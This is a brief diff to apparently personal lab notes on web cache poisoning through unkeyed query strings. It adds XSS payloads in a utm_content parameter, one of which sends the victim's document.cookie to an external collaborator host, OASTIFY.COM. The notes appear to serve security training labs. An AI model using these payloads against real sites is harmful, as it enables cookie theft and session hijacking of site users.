@@ -88,16 +88,19 @@ Change User-Agent on the request
 # Web cache poisoning via an unkeyed query string
 
 utm_content=yui1kx7r00
-
+Origin: x
 ```js
 /?cb=1244&utm_content=vaina'/><script>alert(1)</script>
 ```
 
+```js
+/?utm_content='/><script>document.location="https://OASTIFY.COM?c="+document.cookie</script>
+```
 
 # Web cache poisoning via an unkeyed query parameter
 
-
-
-
+```js
+/?utm_content=123'/><script>alert(1)</script>
+```
 
 
